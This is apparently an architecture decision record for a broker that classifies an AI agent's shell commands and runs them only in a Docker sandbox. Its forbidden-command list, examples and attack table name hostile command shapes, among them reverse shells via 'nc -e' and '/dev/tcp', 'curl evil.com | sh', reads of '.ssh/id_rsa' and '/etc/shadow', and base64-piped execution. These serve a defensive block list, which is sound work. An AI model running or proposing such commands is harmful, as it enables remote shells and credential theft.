# ADR-038 — Full Tool-Loop Broker (mediated command execution over the sandbox)

- **Status:** PROPOSED
- **Date:** 2026-06-18
- **Slug:** `full-tool-loop-broker`
- **Plan:** Stage 3.5 — Full Tool Loop + Approval UX (gap #30)
- **Deciders:** architect, senior-security-engineer (**HARD gate — co-leads, BLOCKING**), senior-backend-1, ceo
- **Build order:** **THIRD.** Begins ONLY after ADR-037 `sandbox.mjs` ships AND the ADR-037 escape suite is fully green. The approval routes/UX (ADR-039) layer on top of this.
- **Related:** ADR-037 (the sandbox this broker drives), ADR-039 (approval UX in front of it), ADR-029/`policy.mjs` (per-agent trust — extended, never weakened), ADR-026/`worktree.mjs` (the `/work` dir), F2b `broker.mjs` (UNCHANGED apply path), `factory.mjs` audit (reused), `server.mjs` `MAX_INFLIGHT`/`scrub`

## SECURITY LAW (stated verbatim in all three ADRs — ADR-037/038/039)

> **A git worktree is NOT a security boundary.** Same uid, same fs, same network as the host. An agent with `Bash` in a worktree can read `~/.ssh`, `rm -rf` the host, or exfiltrate over the network. **Approval prompts stop ACCIDENTS, not malice or prompt-injection.** **THEREFORE the execution boundary MUST be a real OS-level sandbox (Docker container, ADR-037).** The worktree stays ONLY for git/diff/apply. ALL execution is jailed in the container. **NO direct exec on the host, EVER, even with approval.**

## Context

ADR-037 gives us a proven jail (`sandbox.mjs.runInSandbox`). This ADR is the thing that *decides what may run* and drives the jail. It is the gap #30 deliverable: "full tool set through the broker, executed inside the sandbox."

Today there is no command execution at all — `cliReply`/`engineDispatch` allow only Read/Glob/Grep/Write/Edit (`server.mjs` L95–96), never Bash. We are now adding command execution, so the broker must be **default-deny** and treat every command as **untrusted input**.

### Mediated broker, not in-container `claude`

The runtime MEDIATES tool execution; it does **not** hand `claude` a host Bash, and it does **not** run `claude -p` inside the container. Rationale (locked): running `claude` in the box would require mounting subscription creds (`~/.claude`) into an agent-controlled container — unacceptable. So:

- `claude -p` stays on the host with its existing scoped tool set (Read/Glob/Grep/Write/Edit) — **Bash remains OFF in the `claude` argv**.
- The **RUNTIME owns the tool loop.** A command to run is proposed to the runtime (by the operator/UX, or — future — surfaced from the agent's plan), the runtime **classifies** it, **approval-gates** it (ADR-039), then **executes it inside an ephemeral locked container** (ADR-037) over the agent's worktree, and returns the result. Nothing executes on the host.

### Shell reality (critical for classification)

The runtime invokes `docker run … sh -c <command>` via an **argv array** (no host shell — same discipline as ADR-022/worktree.mjs). But *inside* the container the command body runs under `sh -c`, so the command body itself can contain shell metacharacters, chaining, substitution, and pipes. **Classification therefore operates on an untrusted shell string.** We classify **conservatively, default-deny**: anything ambiguous, anything with chaining/substitution that could smuggle a non-SAFE action, is NOT auto-allowed.

## Decision

Add ONE new module — `agent-runtime/tool-broker.mjs` — that classifies commands and drives `sandbox.mjs`. It is the only caller of `runInSandbox` in the product. It reuses `worktree.mjs` for `/work`, `policy.mjs` (ADR-029) for per-agent trust, `factory.audit` for the log, the `MAX_INFLIGHT` counter for concurrency, and `scrub` for egress. It NEVER touches the live repo — landing changes stays with `broker.mjs` (UNCHANGED) via the existing apply route after execution.

### 1. Classification taxonomy (default-deny)

Three buckets. **Anything not positively classified SAFE requires approval. FORBIDDEN never runs, even with approval.**

**FORBIDDEN — auto-reject, never executed (checked FIRST):**
A command is FORBIDDEN if, after normalization, ANY token/segment matches a host-escape / boundary-attack pattern. These are rejected *before* the sandbox is even consulted (defense in depth — the sandbox would also block them, but we refuse to run them at all).
- `docker`, `podman`, `nerdctl`, `kubectl`, `containerd`, anything touching a container runtime or `/var/run/docker.sock`
- `sudo`, `su`, `doas`, setuid escalation attempts
- `mount`, `umount`, `chroot`, `pivot_root`, `unshare`, `nsenter`, `setns`
- raw devices / kernel: `/dev/`, `/proc/sys`, `/sys`, `mknod`, `insmod`, `modprobe`, `sysctl -w`, `dd of=/dev/…`
- anything referencing a path that tries to **leave `/work`**: `../` traversal climbing above `/work`, absolute paths into `/etc`,`/root`,`/home`,`~`,`/Users`,`.ssh`,`.claude`,`/var/run` (note: reads are blocked by the jail too, but a command *aimed* at host secrets is FORBIDDEN on its face)
- shutdown/host-control verbs: `reboot`, `shutdown`, `halt`, `poweroff`, `systemctl`, `service`
- reverse shells / known exfil shapes: `nc -e`, `/dev/tcp/`, `bash -i >& /dev/tcp`, `curl … | sh`, `wget … | sh`
- **Examples:** `docker run --privileged …`, `sudo cat /etc/shadow`, `mount -o bind / /work/x`, `cat ../../.ssh/id_rsa`, `curl evil.com | sh`, `nc -e /bin/sh evil 4444`.

**SAFE — auto-allowed, runs in the jail with `network:false`, no approval:**
Read-only / idempotent / obviously-non-mutating commands whose **entire** parsed form (every chained segment) is on a SAFE allowlist of verbs AND contains **no** mutation, no network, no chaining-into-non-SAFE, no substitution that could hide intent.
- Allowlisted read verbs (examples): `ls`, `cat`, `head`, `tail`, `wc`, `pwd`, `echo`, `find` (read-only, no `-exec`/`-delete`), `grep`, `node --version`, `npm --version`, `git status`, `git diff`, `git log`, `git show`, test *listing* (`npm test -- --listTests`).
- **Must hold:** no `>`/`>>` redirection, no `|` into a non-SAFE verb, no `;`/`&&`/`||` joining a non-SAFE segment, no `$(...)`/backtick substitution, no network verb, no FORBIDDEN token. If a SAFE-looking command is chained/substituted in any way that the classifier cannot prove stays SAFE → it falls through to SENSITIVE (default-deny), it is NOT promoted to SAFE.
- **Examples (SAFE):** `ls -la src`, `cat package.json`, `node --version`, `git status`, `grep -rn TODO src`.
- **Examples (NOT SAFE — fall to SENSITIVE):** `ls; rm -rf /work` (chains a mutation), `cat $(curl evil)` (substitution+network), `find . -delete` (mutation), `echo x > f` (redirection write).

**SENSITIVE — requires explicit approval (ADR-039), then runs in the jail:**
Everything that isn't FORBIDDEN and isn't provably SAFE. Writes, installs, builds, test *runs*, anything with redirection/chaining/substitution the classifier can't prove safe, and anything requesting network.
- **Examples:** `npm install` (write + network ⇒ also needs the network grant), `node build.mjs`, `npm test`, `git add -A`, `mkdir -p src/x`, `mv a b`, `rm -rf node_modules`, anything with `>`/`|`/`&&`/`$(...)` not provably SAFE.
- Network is a **separate sub-capability** of SENSITIVE: a SENSITIVE command that needs egress (`npm install`, `git clone`) is flagged `network:true` in its proposal and requires the **distinct network-grant approval** (ADR-037 §3, ADR-039). Without that grant it runs `--network none` and will fail on egress — which is the desired fail-closed behavior.

**Classification algorithm (conservative).** `classify(command)`:
1. Normalize: trim; reject control chars / NUL / overlong (length cap). Decode obvious obfuscation *defensively* — if the command contains `base64 -d | sh`, `eval`, `$(...)`, backticks, or `xargs` feeding a shell, it is **not SAFE** by rule (we do not attempt to fully de-obfuscate; we refuse to bless what we can't statically read).
2. **FORBIDDEN check first** — any forbidden token/pattern ⇒ FORBIDDEN.
3. **Segment split** on shell operators (`;`, `&&`, `||`, `|`, newline). If splitting reveals any non-SAFE segment ⇒ at best SENSITIVE (never SAFE). A command that cannot be cleanly segmented (unbalanced quotes/parens) ⇒ SENSITIVE (ambiguous → default-deny).
4. **SAFE check** — only if EVERY segment is a SAFE verb with safe args and no redirection/substitution/network ⇒ SAFE.
5. Else ⇒ SENSITIVE (with a `network` flag if a network verb/URL is present).

The classifier is conservative and may push a benign-but-complex command to SENSITIVE — that is acceptable (operator clicks allow), and far safer than a missed FORBIDDEN.

### 2. Module API — `agent-runtime/tool-broker.mjs` (ADDED)

```js
export function createToolBroker({ sandbox, worktrees, policy, audit, scrub, slots }) {
  // sandbox   : ADR-037 createSandbox() — runInSandbox/kill
  // worktrees : ADR-026 createWorktreeMgr() — pathFor(agentId)/create(agentId)
  // policy    : ADR-029 createPolicy() — levelFor/decide (READ-ONLY here; see §3)
  // audit     : factory.audit (reused append-only log)
  // scrub     : server.mjs scrub (egress redaction)
  // slots     : { tryAcquire, release } over the shared MAX_INFLIGHT counter

  // classify — pure, no side effects. Returns the verdict + declared capabilities.
  function classify(command) {
    // → { class: "SAFE"|"SENSITIVE"|"FORBIDDEN", network: bool, reason, segments }
  }

  // execTool — the mediated loop step. agentId → its worktree → jailed exec.
  //   approval: { decision:"allow"|"deny", scope?, network?:bool, callId } from ADR-039
  // Behavior:
  //   FORBIDDEN          → never runs. returns { ok:false, class, rejected:"forbidden" }.
  //   SAFE               → runs immediately in jail (network:false). no approval needed.
  //   SENSITIVE w/o allow→ returns { ok:false, pending:true } (caller opens approval, ADR-039).
  //   SENSITIVE + allow  → runs in jail; network only if approval.network===true.
  // Always: acquire a slot (MAX_INFLIGHT) or 429; resolve worktreeDir = worktrees.pathFor(agentId)
  //   (create if missing); runInSandbox(worktreeDir, command, {network, timeoutMs, signal, callId});
  //   scrub stdout/stderr; audit the call; release slot.
  async function execTool(agentId, command, { approval } = {}) {
    // → { ok, class, network, exitCode, stdout, stderr, timedOut, killed, callId }
  }

  return { classify, execTool };
}
```

`tool-broker.mjs` is wired in `server.mjs` next to the existing brokers (near L469/L707), reusing: the worktree mgr (`engineWorktrees`, ADR-026), `policy` (ADR-029), `factory.audit`, `scrub`, and the **shared** `tryAcquireSlot/releaseSlot` over `MAX_INFLIGHT` (`server.mjs` L709–710) — **no second concurrency counter**.

### 3. Trust policy (extends ADR-029 — never weakens it)

ADR-029 `policy.mjs` decides the *apply* trigger (manual / auto-safe / never) and HARD-invariants that it can only ever SUBTRACT from the broker's permissions. This ADR extends that model to **execution**, with the same one-way ratchet:

- **Exec is ALWAYS gated.** Per-agent policy may, at most, let SAFE commands auto-run (they already do — SAFE = read-only). It may **never** auto-allow SENSITIVE, and **never** un-forbid FORBIDDEN, regardless of an agent's apply-trust level. There is no "auto-exec" trust level. `auto-safe` apply trust does NOT grant auto-exec of writes.
- A future per-agent / per-command-class allow-for-session memory (ADR-039 §session scope) is the *only* relaxation, it is operator-granted per session, bounded, and still cannot touch FORBIDDEN or silently grant network.
- Policy load failure / tamper ⇒ fail closed to most-restrictive (inherited from `policy.mjs` `sigOk` behavior). FORBIDDEN/SENSITIVE gating holds independent of policy state — the classifier backstops regardless.

### 4. Live repo untouched until apply

Commands run over the **worktree** at `/work` (writes flow back to the host worktree per ADR-037 §1). They NEVER write the live repo. Landing changes to the live repo remains EXCLUSIVELY the F2b apply broker (`broker.mjs`, UNCHANGED) via the existing operator-gated `/apply` route, which re-runs `applyAllowed`/`CONFIG_GUARD`/symlink+realpath on every path. So a command that `npm install`s into the worktree cannot push `node_modules` or a tampered `package.json` into the repo except through the apply guards (which already deny `package.json`/config — `policy.mjs` L31, `guards.mjs` CONFIG_GUARD).

### 5. Concurrency, kill, timeout

- **Concurrency:** every `execTool` acquires the shared `MAX_INFLIGHT` slot; exhausted ⇒ 429 (same posture as chat/engine). One counter for the whole runtime.
- **Per-call timeout:** passed to `runInSandbox` (`RUNTIME_SANDBOX_TIMEOUT_MS`).
- **Kill-switch:** `sandbox.kill(callId)` (ADR-039 kill route + scheduler shutdown). AbortSignal threaded from the route.

### 6. Audit (reuse factory append-only log)

Every classification + execution is audited via `factory.audit` (`factory.mjs` L651, `readAudit` L659) — append-only, secrets never logged:

```
audit("tool.classify", { agentId, callId, class, network, reason });
audit("tool.exec",     { agentId, callId, class, network, exitCode, timedOut, killed, durationMs });
audit("tool.reject",   { agentId, callId, class:"FORBIDDEN", reason });   // never-run
```

Command text is recorded **scrubbed + length-capped**; stdout/stderr are NOT stored in the audit (only exit/flags) to keep the log bounded and secret-free — the live stream (ADR-039 SSE) carries scrubbed output transiently.

## Security invariant (sr-security HARD gate — BLOCKING)

**INVARIANT: every command is classified before it can run; FORBIDDEN never runs; nothing but proven-SAFE runs without an explicit approval; network is never on without a separate grant; every command executes ONLY inside the ADR-037 jail over the worktree, never on the host, never in the live repo; every classification and execution is audited.**

### attack → mitigation

| Attack | Vector | Mitigation |
|---|---|---|
| Command injection / chaining | `ls; rm -rf /work`, `cat f && curl evil` | segment-split on `;&&\|\|\| \n`; any non-SAFE segment ⇒ not SAFE ⇒ approval; FORBIDDEN segment ⇒ reject. |
| Substitution smuggling | `cat $(curl evil)`, backticks, `eval` | presence of `$(...)`/backtick/`eval` ⇒ never SAFE (default-deny); FORBIDDEN if it resolves to a forbidden verb pattern. |
| Obfuscation | `echo … \| base64 -d \| sh`, `xargs sh` | `base64 -d \| sh` / `xargs`-into-shell / `eval` ⇒ never SAFE; we refuse to bless un-statically-readable commands. The jail also blocks the resulting action. |
| Classification bypass | newline-spliced, unicode tricks, unbalanced quotes | reject control/NUL, length cap; unparseable/ambiguous ⇒ SENSITIVE (default-deny), never SAFE. |
| Approval bypass | call `execTool` with forged `approval.decision:"allow"` | approval object is minted by the ADR-039 route (auth+origin+host gated, server-side callId binding); `execTool` trusts only a server-issued approval for that callId, not a client-asserted flag (see ADR-039 §replay/binding). |
| Forbidden-command obfuscation | `s​udo`, `/bin/su`, path-aliased docker | normalize before match; match on basename + known aliases (`/bin/su`,`/usr/bin/sudo`); strip zero-width; default-deny on ambiguity. Jail backstops (no sudo bin, no socket) even if a match is missed. |
| Resource exhaustion | fork bomb, OOM, CPU spin via an approved cmd | bounded by ADR-037 limits (`pids/memory/cpu/timeout`) regardless of classification; shared `MAX_INFLIGHT` caps concurrent containers. |
| Secret exfil over granted network | approved `npm install` curls out a secret | network is per-call + separately approved + audited; the box has NO host secrets/fs mounted, so there is nothing host-side to exfil; `scrub` redacts known secret shapes from any output. |
| Live-repo poisoning | command writes `package.json`/`scripts/*` then auto-applied | execution writes only the worktree; apply path is UNCHANGED `broker.mjs` + `policy.mjs` (config/exec paths never auto-apply, always gated). |
| Privilege via policy | agent with `auto-safe` apply trust auto-runs writes | no "auto-exec" level exists; SENSITIVE always needs approval; policy can only auto-run read-only SAFE. |

## Consequences

**Positive** — the agent gets a real tool loop without ever touching the host; default-deny + conservative classifier means the dangerous default is "ask"; reuses every existing guard (worktree, apply broker, policy, audit, MAX_INFLIGHT, scrub); FORBIDDEN list + jail are belt-and-suspenders.

**Negative / accepted** — conservative classification will send some benign commands to approval (extra clicks) — accepted for safety. The classifier is a static, conservative parser, not a full shell grammar — we deliberately default-deny rather than fully parse; the jail is the hard backstop for anything misclassified as SENSITIVE (it still can't escape). Per-command container spin-up latency (inherited from ADR-037).

**Observability** — `audit` events above; `GET /runtime/health` already reports `inflight`/`maxInflight` (L1253) — shared by exec. SSE stream of running commands is ADR-039.

## Alternatives rejected

1. **Allow Bash in the `claude` argv, sandbox nothing** — host exec from a worktree; SECURITY LAW. NO.
2. **Run `claude -p` in the container** — mounts `~/.claude` creds into an agent box. NO (the whole reason the broker mediates).
3. **Allowlist-by-binary only (no chaining analysis)** — `ls; rm -rf /work` passes a binary check; chaining must be analyzed. NO.
4. **Full shell parser to "understand" any command and decide** — large attack surface, brittle; we choose conservative default-deny + the jail as backstop instead.
5. **Auto-exec trust level mirroring `auto-safe` apply** — would auto-run writes/installs; rejected — exec is always gated.

## sr-security HARD sign-off conditions (BLOCKING)

- (a) FORBIDDEN is checked first and is unconditional (no approval can run it); the FORBIDDEN pattern set covers container-runtime/socket, sudo/su, mount/namespace, raw devices, host-path targeting, shutdown, reverse-shell/exfil shapes.
- (b) SAFE is a positive allowlist requiring EVERY segment SAFE with no redirection/substitution/network; ambiguous ⇒ SENSITIVE.
- (c) SENSITIVE never auto-runs; network is a separate per-call grant; no policy level grants auto-exec.
- (d) `execTool` runs ONLY via `runInSandbox` (ADR-037) over the worktree; never host, never live repo; landing stays on UNCHANGED `broker.mjs`.
- (e) Shared `MAX_INFLIGHT`, per-call timeout, kill-switch wired.
- (f) Every classify/exec/reject audited via `factory.audit`; command scrubbed+capped; stdout/stderr never persisted.
- (g) The ADR-037 escape suite is GREEN before this module ships (build-order gate).
